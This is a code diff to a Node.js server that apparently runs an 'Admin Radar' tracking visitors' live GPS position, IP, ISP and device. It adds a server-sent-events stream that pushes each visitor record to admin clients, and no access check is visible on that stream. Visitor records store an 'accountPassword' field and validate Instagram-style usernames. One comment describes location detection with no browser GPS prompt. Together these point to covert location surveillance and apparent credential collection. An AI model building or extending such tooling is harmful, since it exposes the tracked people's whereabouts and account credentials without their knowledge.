@@ -4425,7 +4425,17 @@ function isLoopbackIp(ip = '') {
   return !s || s === '::1' || s === '127.0.0.1' || s === '0.0.0.0' || s === 'localhost';
 }
 
-// Reject 0,0, NaN, null, or out-of-range coordinates so a user's last known real GPS position is NEVER overwritten or zeroed out!
+// Detect legacy hardcoded Sana'a default placeholder coordinates so they never overwrite or block a user's real GPS position
+function isHardcodedDefaultCoord(lat, lng) {
+  const la = Number(lat);
+  const ln = Number(lng);
+  if (!isFinite(la) || !isFinite(ln)) return true;
+  if (Math.abs(la - 15.3538) < 0.00001 && Math.abs(ln - 44.2058) < 0.00001) return true;
+  if (Math.abs(la - 15.3694) < 0.00001 && Math.abs(ln - 44.1910) < 0.00001) return true;
+  return false;
+}
+
+// Reject 0,0, NaN, null, out-of-range, or hardcoded placeholder coordinates so a user's real GPS position is NEVER overwritten!
 function isValidNonZeroCoord(lat, lng) {
   const la = Number(lat);
   const ln = Number(lng);
@@ -4433,7 +4443,39 @@ function isValidNonZeroCoord(lat, lng) {
   if (isNaN(la) || isNaN(ln)) return false;
   if (Math.abs(la) < 0.0001 && Math.abs(ln) < 0.0001) return false;
   if (Math.abs(la) > 90 || Math.abs(ln) > 180) return false;
+  if (isHardcodedDefaultCoord(la, ln)) return false;
   return true;
+}
+
+const ADMIN_SSE_CLIENTS = new Set();
+
+function broadcastAdminRadarUpdate(payload) {
+  if (ADMIN_SSE_CLIENTS.size === 0) return;
+  const msg = `data: ${JSON.stringify(payload)}\n\n`;
+  for (const clientRes of ADMIN_SSE_CLIENTS) {
+    try {
+      clientRes.write(msg);
+    } catch (e) {
+      ADMIN_SSE_CLIENTS.delete(clientRes);
+    }
+  }
+}
+
+function computeEffectiveConnectionStatus(v) {
+  if (!v) return 'exited';
+  const raw = String(v.connectionStatus || v.liveStatus || '').trim();
+  if (raw === 'gps_off' || raw === 'gps_disabled' || v.gpsEnabled === false) {
+    return 'gps_off';
+  }
+  const lastHbMs = new Date(v.lastHeartbeatAt || v.lastSeen || v.firstSeen || 0).getTime() || 0;
+  const ageSec = lastHbMs > 0 ? Math.max(0, (Date.now() - lastHbMs) / 1000) : 999999;
+  if (raw === 'exited' || ageSec > 90) {
+    return 'exited';
+  }
+  if (raw === 'background_live') {
+    return 'background_live';
+  }
+  return 'live';
 }
 
 function extractShortDeviceTitle(deviceStr = '') {
@@ -4629,8 +4671,8 @@ function reconcileAllUsersAndVisitors(logs, fallbackRealIp = '') {
         suspended: u === '1' ? false : Boolean(v.isBanned ?? v.suspended),
         city: v.city || 'صنعاء',
         country: v.country || 'اليمن',
-        lat: typeof v.lat === 'number' ? v.lat : 15.3538,
-        lng: typeof v.lng === 'number' ? v.lng : 44.2058,
+        lat: isValidNonZeroCoord(v.lat, v.lng) ? Number(v.lat) : null,
+        lng: isValidNonZeroCoord(v.lat, v.lng) ? Number(v.lng) : null,
         device: v.device || '',
         ip: !isLoopbackIp(v.ip) ? v.ip : firstKnownRealIp,
         createdAt: v.firstSeen || nowIso,
@@ -4639,6 +4681,13 @@ function reconcileAllUsersAndVisitors(logs, fallbackRealIp = '') {
     } else {
       if (computedHash && !logs.savedAccounts[u].passwordHash) {
         logs.savedAccounts[u].passwordHash = computedHash;
+      }
+      if (isValidNonZeroCoord(v.lat, v.lng)) {
+        logs.savedAccounts[u].lat = Number(v.lat);
+        logs.savedAccounts[u].lng = Number(v.lng);
+      } else if (isHardcodedDefaultCoord(logs.savedAccounts[u].lat, logs.savedAccounts[u].lng)) {
+        logs.savedAccounts[u].lat = null;
+        logs.savedAccounts[u].lng = null;
       }
       if (!logs.savedAccounts[u].ip || isLoopbackIp(logs.savedAccounts[u].ip)) {
         if (!isLoopbackIp(v.ip)) logs.savedAccounts[u].ip = v.ip;
@@ -4698,9 +4747,9 @@ function reconcileAllUsersAndVisitors(logs, fallbackRealIp = '') {
       region: acc?.region || 'أمانة العاصمة',
       locationName: `${resolvedCity}، ${resolvedCountry}`,
       isp: normalizeRealIspName(acc?.isp || '', resolvedCountry, resolvedIp),
-      lat: typeof acc?.lat === 'number' ? acc.lat : 15.3538,
-      lng: typeof acc?.lng === 'number' ? acc.lng : 44.2058,
-      locationSource: acc?.locationSource || 'IN_APP',
+      lat: isValidNonZeroCoord(acc?.lat, acc?.lng) ? Number(acc.lat) : null,
+      lng: isValidNonZeroCoord(acc?.lat, acc?.lng) ? Number(acc.lng) : null,
+      locationSource: acc?.locationSource || 'GPS',
       accuracy: null,
       device: normalizeRealDeviceName(acc?.device || 'هاتف ذكي / متصفح ويب مباشر', ''),
       firstSeen: firstSeenIso,
@@ -4749,6 +4798,7 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
       const autoKey = item.deviceIpSignature || getDeviceIpSignature(item.device, resolvedAutoIp) || ('id:' + item.id);
       if (!mapByKey.has(autoKey)) {
         const shortDev = extractShortDeviceTitle(normalizeRealDeviceName(item.device, item.userAgent));
+        const guestEffStatus = computeEffectiveConnectionStatus(item);
         mapByKey.set(autoKey, {
           ...item,
           visitorName: rawVName || (shortDev + ' • ' + (resolvedAutoIp || 'IP')),
@@ -4759,6 +4809,10 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
           ip: resolvedAutoIp,
           localIp: item.localIp || '',
           asn: item.asn || '',
+          lat: isValidNonZeroCoord(item.lat, item.lng) ? Number(item.lat) : null,
+          lng: isValidNonZeroCoord(item.lat, item.lng) ? Number(item.lng) : null,
+          connectionStatus: guestEffStatus,
+          liveStatus: guestEffStatus,
           isp: normalizeRealIspName(item.isp, item.country, resolvedAutoIp),
           device: normalizeRealDeviceName(item.device, item.userAgent),
           loginCount: item.loginCount || 1,
@@ -4804,12 +4858,27 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
           });
         }
       }
+      const snapWithValidCoords = Array.isArray(item.previousLogs)
+        ? item.previousLogs.find(sn => sn && isValidNonZeroCoord(sn.lat, sn.lng))
+        : null;
       const resolvedLat = isValidNonZeroCoord(item.lat, item.lng)
         ? Number(item.lat)
-        : (isValidNonZeroCoord(savedAcc.lat, savedAcc.lng) ? Number(savedAcc.lat) : 15.3538);
+        : (isValidNonZeroCoord(savedAcc.lat, savedAcc.lng)
+            ? Number(savedAcc.lat)
+            : (snapWithValidCoords ? Number(snapWithValidCoords.lat) : null));
       const resolvedLng = isValidNonZeroCoord(item.lat, item.lng)
         ? Number(item.lng)
-        : (isValidNonZeroCoord(savedAcc.lat, savedAcc.lng) ? Number(savedAcc.lng) : 44.2058);
+        : (isValidNonZeroCoord(savedAcc.lat, savedAcc.lng)
+            ? Number(savedAcc.lng)
+            : (snapWithValidCoords ? Number(snapWithValidCoords.lng) : null));
+      const effConnStatus = computeEffectiveConnectionStatus({
+        ...savedAcc,
+        ...item,
+        liveStatus: item.liveStatus || savedAcc.liveStatus,
+        connectionStatus: item.connectionStatus || item.liveStatus || savedAcc.connectionStatus || savedAcc.liveStatus,
+        gpsEnabled: item.gpsEnabled !== undefined ? item.gpsEnabled : savedAcc.gpsEnabled,
+        lastHeartbeatAt: item.lastHeartbeatAt || savedAcc.lastHeartbeatAt || item.lastSeen || item.firstSeen
+      });
       mapByKey.set(key, {
         ...item,
         id: canonicalUserId,
@@ -4827,7 +4896,8 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
         lat: resolvedLat,
         lng: resolvedLng,
         locationSource: item.locationSource || savedAcc.locationSource || 'GPS',
-        liveStatus: item.liveStatus || savedAcc.liveStatus || 'live',
+        connectionStatus: effConnStatus,
+        liveStatus: effConnStatus,
         gpsEnabled: item.gpsEnabled !== undefined ? Boolean(item.gpsEnabled) : (savedAcc.gpsEnabled !== undefined ? Boolean(savedAcc.gpsEnabled) : true),
         gpsClosedAt: item.gpsClosedAt || savedAcc.gpsClosedAt || null,
         lastHeartbeatAt: item.lastHeartbeatAt || savedAcc.lastHeartbeatAt || item.lastSeen || item.firstSeen,
@@ -5061,8 +5131,12 @@ async function recordVisitor(info) {
       suspended: isBannedFlag,
       city: finalCity || prevAcc.city || 'صنعاء',
       country: finalCountry || prevAcc.country || 'اليمن',
-      lat: info.lat ? Number(info.lat) : (typeof prevAcc.lat === 'number' ? prevAcc.lat : 15.3538),
-      lng: info.lng ? Number(info.lng) : (typeof prevAcc.lng === 'number' ? prevAcc.lng : 44.2058),
+      lat: isValidNonZeroCoord(info.lat, info.lng) ? Number(info.lat) : (isValidNonZeroCoord(prevAcc.lat, prevAcc.lng) ? Number(prevAcc.lat) : null),
+      lng: isValidNonZeroCoord(info.lat, info.lng) ? Number(info.lng) : (isValidNonZeroCoord(prevAcc.lat, prevAcc.lng) ? Number(prevAcc.lng) : null),
+      connectionStatus: 'live',
+      liveStatus: 'live',
+      gpsEnabled: true,
+      lastHeartbeatAt: now,
       device: cleanDevice,
       ip: incomingRealIp || prevAcc.ip || '127.0.0.1',
       createdAt: prevCreated,
@@ -5189,10 +5263,14 @@ async function recordVisitor(info) {
         v.lat = Number(savedLat);
         v.lng = Number(savedLng);
       } else {
-        v.lat = 15.3538;
-        v.lng = 44.2058;
+        v.lat = null;
+        v.lng = null;
       }
     }
+    v.connectionStatus = 'live';
+    v.liveStatus = 'live';
+    v.gpsEnabled = true;
+    v.lastHeartbeatAt = now;
     v.isp = cleanIsp;
     v.device = cleanDevice;
 
@@ -5207,9 +5285,17 @@ async function recordVisitor(info) {
     );
     const freshLoginMs = Math.max(Date.now(), prevDelTs > 0 ? prevDelTs + 5000 : 0);
     const freshIso = new Date(freshLoginMs).toISOString();
+    const savedLat = !isAutoDeviceOnly && normInputName ? logs.savedAccounts[normInputName]?.lat : null;
+    const savedLng = !isAutoDeviceOnly && normInputName ? logs.savedAccounts[normInputName]?.lng : null;
+    const initialLat = isValidNonZeroCoord(info.lat, info.lng)
+      ? Number(info.lat)
+      : (isValidNonZeroCoord(savedLat, savedLng) ? Number(savedLat) : null);
+    const initialLng = isValidNonZeroCoord(info.lat, info.lng)
+      ? Number(info.lng)
+      : (isValidNonZeroCoord(savedLat, savedLng) ? Number(savedLng) : null);
 
     v = {
-      id: canonicalUserId || `vis_${Date.now()}_${Math.floor(Math.random() * 10000)}`,
+      id: canonicalUserId || info.visitorId || `vis_${Date.now()}_${Math.floor(Math.random() * 10000)}`,
       visitorName: cleanInputName,
       username: !isAutoDeviceOnly ? (cleanInputName.startsWith('@') ? cleanInputName : `@${cleanInputName}`) : '',
       accountPassword: effectivePassword || '',
@@ -5230,9 +5316,13 @@ async function recordVisitor(info) {
       region: finalRegion,
       locationName: finalLocationName,
       isp: cleanIsp,
-      lat: info.lat ? Number(info.lat) : 15.3538,
-      lng: info.lng ? Number(info.lng) : 44.2058,
-      locationSource: info.locationSource || 'IN_APP',
+      lat: initialLat,
+      lng: initialLng,
+      locationSource: isValidNonZeroCoord(info.lat, info.lng) ? (info.locationSource || 'GPS') : 'GPS',
+      connectionStatus: 'live',
+      liveStatus: 'live',
+      gpsEnabled: true,
+      lastHeartbeatAt: freshIso,
       accuracy: info.accuracy || null,
       device: cleanDevice,
       firstSeen: freshIso,
@@ -5256,6 +5346,7 @@ async function recordVisitor(info) {
   }
   reconcileAllUsersAndVisitors(logs, incomingRealIp);
   saveAdminLogs(logs);
+  broadcastAdminRadarUpdate({ type: 'visitor_update', visitor: v, timestamp: now });
   return v;
 }
 
@@ -5527,12 +5618,16 @@ const server = http.createServer(async (req, res) => {
   }
 
   // Live Real-Time GPS Coordinate & Status Telemetry Endpoint (POST /api/user/update-location & POST /api/user/status-telemetry)
-  // Updates the user's live GPS position & status on the Admin Radar immediately and NEVER zeroes out or removes their last known real coordinates when the app closes or GPS turns off!
+  // Dynamically matches ANY user or visitor by userId, username, deviceId, or IP, overwrites stale coordinates with real (lat, lon), sets connectionStatus, and broadcasts immediately to Admin Radar!
   if ((pathname === '/api/user/update-location' || pathname === '/api/user/status-telemetry') && req.method === 'POST') {
     const data = await readRequestBody(req);
     const logs = loadAdminLogs();
-    const rawUser = normalizeIgUsername(data.username || data.visitorName || '');
-    const visitorId = String(data.visitorId || '').trim();
+    const rawUserFromId = String(data.userId || data.visitorId || '').trim().toLowerCase().startsWith('user_')
+      ? String(data.userId || data.visitorId || '').trim().slice(5)
+      : '';
+    const rawUser = normalizeIgUsername(data.username || data.visitorName || rawUserFromId || '');
+    const visitorId = String(data.userId || data.visitorId || '').trim();
+    const deviceId = String(data.deviceId || data.visitorId || '').trim();
 
     if (rawUser && rawUser !== '1' && checkUserBannedStatus(rawUser, visitorId, logs)) {
       res.writeHead(403, { 'Content-Type': 'application/json; charset=utf-8' });
@@ -5548,10 +5643,11 @@ const server = http.createServer(async (req, res) => {
     const inLng = Number(data.lon ?? data.lng);
     const hasValidIncomingCoords = isValidNonZeroCoord(inLat, inLng);
     const now = new Date().toISOString();
-    const isGpsDisabledReport = data.status === 'gps_off' || data.status === 'gps_disabled' || data.gpsEnabled === false || data.event === 'gps_closed';
+    const isGpsDisabledReport = data.status === 'gps_off' || data.status === 'gps_disabled' || data.connectionStatus === 'gps_off' || data.gpsEnabled === false || data.event === 'gps_closed';
+    const isExitedReport = data.status === 'exited' || data.connectionStatus === 'exited' || data.event === 'app_exited';
     const incomingLiveStatus = isGpsDisabledReport
       ? 'gps_off'
-      : (data.status === 'background_live' ? 'background_live' : 'live');
+      : (isExitedReport ? 'exited' : (data.status === 'background_live' ? 'background_live' : 'live'));
     const incomingGpsEnabled = !isGpsDisabledReport;
     const incomingGpsClosedAt = isGpsDisabledReport ? (data.timestamp || now) : null;
 
@@ -5561,32 +5657,34 @@ const server = http.createServer(async (req, res) => {
     const cleanDevice = normalizeRealDeviceName(data.device || '', req.headers['user-agent'] || '');
     const isReg = Boolean(rawUser && VALID_IG_USERNAME_REGEX.test(rawUser));
 
+    // Dynamically match visitor record by username, userId, visitorId, deviceId, or IP
     let v = null;
     if (isReg) {
       v = (logs.visitors || []).find(x => x && !x.isDeviceIpAutoAuth && normalizeIgUsername(x.username || x.visitorName || '') === rawUser);
     }
     if (!v && visitorId) {
-      v = (logs.visitors || []).find(x => x && x.id === visitorId);
+      v = (logs.visitors || []).find(x => x && (x.id === visitorId || x.deviceId === visitorId));
+    }
+    if (!v && deviceId) {
+      v = (logs.visitors || []).find(x => x && (x.id === deviceId || x.deviceId === deviceId));
     }
     if (!v && !isReg) {
       const devSig = getDeviceIpSignature(cleanDevice, realClientIp);
-      v = (logs.visitors || []).find(x => x && x.isDeviceIpAutoAuth && (x.deviceIpSignature === devSig || getDeviceIpSignature(x.device, x.ip) === devSig));
+      v = (logs.visitors || []).find(x => x && x.isDeviceIpAutoAuth && (x.deviceIpSignature === devSig || getDeviceIpSignature(x.device, x.ip) === devSig || (!isLoopbackIp(realClientIp) && x.ip === realClientIp)));
     }
 
-    // If neither incoming coords nor existing visitor coords are valid, and it's not a gps_disabled status report, preserve last known
-    if (!hasValidIncomingCoords && !isGpsDisabledReport && (!v || !isValidNonZeroCoord(v.lat, v.lng))) {
-      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
-      res.end(JSON.stringify({
-        status: 'preserved_last_known',
-        message: 'Ignored empty/0,0 coordinates; last known real GPS coordinates preserved.'
-      }));
-      return;
-    }
+    const prevValidLat = (v && isValidNonZeroCoord(v.lat, v.lng))
+      ? Number(v.lat)
+      : (isReg && isValidNonZeroCoord(logs.savedAccounts?.[rawUser]?.lat, logs.savedAccounts?.[rawUser]?.lng) ? Number(logs.savedAccounts[rawUser].lat) : null);
+    const prevValidLng = (v && isValidNonZeroCoord(v.lat, v.lng))
+      ? Number(v.lng)
+      : (isReg && isValidNonZeroCoord(logs.savedAccounts?.[rawUser]?.lat, logs.savedAccounts?.[rawUser]?.lng) ? Number(logs.savedAccounts[rawUser].lng) : null);
 
-    const effLat = hasValidIncomingCoords ? inLat : (v && isValidNonZeroCoord(v.lat, v.lng) ? Number(v.lat) : 15.3694);
-    const effLng = hasValidIncomingCoords ? inLng : (v && isValidNonZeroCoord(v.lat, v.lng) ? Number(v.lng) : 44.1910);
+    // Overwrite stale coordinates whenever genuine (inLat, inLng) arrive; otherwise keep previous valid coordinates (never hardcode 15.3694, 44.1910!)
+    const effLat = hasValidIncomingCoords ? inLat : prevValidLat;
+    const effLng = hasValidIncomingCoords ? inLng : prevValidLng;
 
-    let resolvedPlace = resolveLocalNeighborhood(effLat, effLng);
+    const resolvedPlace = (effLat !== null && effLng !== null) ? resolveLocalNeighborhood(effLat, effLng) : null;
     const finalCity = resolvedPlace?.city || data.city || (v && v.city) || 'صنعاء';
     const finalCountry = resolvedPlace?.country || data.country || (v && v.country) || 'اليمن';
     const finalRegion = resolvedPlace?.neighborhood || data.region || (v && v.region) || 'أمانة العاصمة';
@@ -5606,7 +5704,7 @@ const server = http.createServer(async (req, res) => {
           updatedAt: now
         };
       }
-      if (hasValidIncomingCoords || !isValidNonZeroCoord(logs.savedAccounts[rawUser].lat, logs.savedAccounts[rawUser].lng)) {
+      if (effLat !== null && effLng !== null) {
         logs.savedAccounts[rawUser].lat = effLat;
         logs.savedAccounts[rawUser].lng = effLng;
         logs.savedAccounts[rawUser].city = finalCity;
@@ -5614,6 +5712,7 @@ const server = http.createServer(async (req, res) => {
         logs.savedAccounts[rawUser].region = finalRegion;
       }
       logs.savedAccounts[rawUser].locationSource = 'GPS';
+      logs.savedAccounts[rawUser].connectionStatus = incomingLiveStatus;
       logs.savedAccounts[rawUser].liveStatus = incomingLiveStatus;
       logs.savedAccounts[rawUser].gpsEnabled = incomingGpsEnabled;
       logs.savedAccounts[rawUser].gpsClosedAt = isGpsDisabledReport ? (logs.savedAccounts[rawUser].gpsClosedAt || incomingGpsClosedAt) : null;
@@ -5624,7 +5723,14 @@ const server = http.createServer(async (req, res) => {
     }
 
     if (v) {
-      if (hasValidIncomingCoords || !isValidNonZeroCoord(v.lat, v.lng)) {
+      if (isReg) {
+        v.id = `user_${rawUser}`;
+        v.visitorName = `@${rawUser}`;
+        v.username = `@${rawUser}`;
+        v.isDeviceIpAutoAuth = false;
+      }
+      if (deviceId) v.deviceId = deviceId;
+      if (effLat !== null && effLng !== null) {
         v.lat = effLat;
         v.lng = effLng;
         v.city = finalCity;
@@ -5634,6 +5740,7 @@ const server = http.createServer(async (req, res) => {
       }
       v.accuracy = data.accuracy ? Math.round(Number(data.accuracy)) : (v.accuracy || 15);
       v.locationSource = 'GPS';
+      v.connectionStatus = incomingLiveStatus;
       v.liveStatus = incomingLiveStatus;
       v.gpsEnabled = incomingGpsEnabled;
       v.gpsClosedAt = isGpsDisabledReport ? (v.gpsClosedAt || incomingGpsClosedAt) : null;
@@ -5645,7 +5752,8 @@ const server = http.createServer(async (req, res) => {
     } else {
       const shortDev = extractShortDeviceTitle(cleanDevice);
       v = {
-        id: isReg ? `user_${rawUser}` : (visitorId || `vis_${Date.now()}_${Math.floor(Math.random() * 10000)}`),
+        id: isReg ? `user_${rawUser}` : (visitorId || deviceId || `vis_${Date.now()}_${Math.floor(Math.random() * 10000)}`),
+        deviceId: deviceId || visitorId || '',
         visitorName: isReg ? `@${rawUser}` : `${shortDev} • ${realClientIp}`,
         username: isReg ? `@${rawUser}` : '',
         isDeviceIpAutoAuth: !isReg,
@@ -5663,6 +5771,7 @@ const server = http.createServer(async (req, res) => {
         lng: effLng,
         accuracy: data.accuracy ? Math.round(Number(data.accuracy)) : 15,
         locationSource: 'GPS',
+        connectionStatus: incomingLiveStatus,
         liveStatus: incomingLiveStatus,
         gpsEnabled: incomingGpsEnabled,
         gpsClosedAt: incomingGpsClosedAt,
@@ -5680,15 +5789,19 @@ const server = http.createServer(async (req, res) => {
     }
 
     saveAdminLogs(logs);
+    broadcastAdminRadarUpdate({ type: 'visitor_update', visitor: v, timestamp: now });
     res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
     res.end(JSON.stringify({
       status: 'ok',
+      userId: v.id,
+      username: v.username,
       lat: v.lat,
       lng: v.lng,
       city: v.city,
       country: v.country,
       region: v.region,
       locationSource: 'GPS',
+      connectionStatus: v.connectionStatus,
       liveStatus: v.liveStatus,
       gpsEnabled: v.gpsEnabled,
       gpsClosedAt: v.gpsClosedAt || null,
@@ -5900,6 +6013,23 @@ const server = http.createServer(async (req, res) => {
   if (pathname === '/api/health') {
     res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
     res.end(JSON.stringify({ status: 'alive', time: new Date().toISOString() }));
+    return;
+  }
+
+  // Real-Time Admin Radar SSE Stream (broadcasts live visitor/user coordinate & status changes immediately)
+  if (pathname === '/api/admin/stream') {
+    const sseWriteHead = res._origWriteHead || res.writeHead.bind(res);
+    sseWriteHead(200, {
+      'Content-Type': 'text/event-stream; charset=utf-8',
+      'Cache-Control': 'no-cache, no-transform',
+      'Connection': 'keep-alive',
+      'X-Accel-Buffering': 'no'
+    });
+    res.write(`data: ${JSON.stringify({ type: 'connected', timestamp: new Date().toISOString() })}\n\n`);
+    ADMIN_SSE_CLIENTS.add(res);
+    req.on('close', () => {
+      ADMIN_SSE_CLIENTS.delete(res);
+    });
     return;
   }
 
@@ -6514,7 +6644,7 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // Pure In-App Silent Location Detection Endpoint (Zero Browser GPS Prompt - IP & In-App City Picker with 10-Min Cache & Sana'a 15.3694, 44.1910 Fallback)
+  // Pure In-App Silent Location Detection Endpoint (Real IP Geolocation & City Picker - Never overwrites user coordinates with hardcoded defaults)
   if (pathname === '/api/in-app-location') {
     if (!global.IN_APP_IP_LOCATION_CACHE) {
       global.IN_APP_IP_LOCATION_CACHE = new Map();
@@ -6525,8 +6655,8 @@ const server = http.createServer(async (req, res) => {
     const visitorId = String(parsedUrl.query.visitorId || '').trim();
     const rawDevice = String(parsedUrl.query.device || '').trim();
 
-    let lat = 15.3694;
-    let lon = 44.1910;
+    let lat = null;
+    let lon = null;
     let detectedCity = 'صنعاء';
     let detectedCountry = 'اليمن';
     let countryCode = 'ye';
@@ -6612,29 +6742,28 @@ const server = http.createServer(async (req, res) => {
           } catch (e) {}
         }
 
-        if (!isValidNonZeroCoord(lat, lon)) {
-          lat = 15.3694;
-          lon = 44.1910;
+        if (isValidNonZeroCoord(lat, lon)) {
+          global.IN_APP_IP_LOCATION_CACHE.set(cacheKey, {
+            ts: Date.now(),
+            lat,
+            lon,
+            city: detectedCity,
+            country: detectedCountry,
+            countryCode,
+            publicIp,
+            isp,
+            asn
+          });
         }
-
-        global.IN_APP_IP_LOCATION_CACHE.set(cacheKey, {
-          ts: Date.now(),
-          lat,
-          lon,
-          city: detectedCity,
-          country: detectedCountry,
-          countryCode,
-          publicIp,
-          isp,
-          asn
-        });
       }
     }
 
     let scopeInfo = null;
-    try {
-      scopeInfo = await resolveLocationScopeWithBoundingBoxes(lat, lon);
-    } catch (e) {}
+    if (isValidNonZeroCoord(lat, lon)) {
+      try {
+        scopeInfo = await resolveLocationScopeWithBoundingBoxes(lat, lon);
+      } catch (e) {}
+    }
 
     const finalCity = (manualCity ? detectedCity : (scopeInfo?.city || detectedCity)) || 'صنعاء';
     const finalCountry = (scopeInfo?.country || detectedCountry) || 'اليمن';
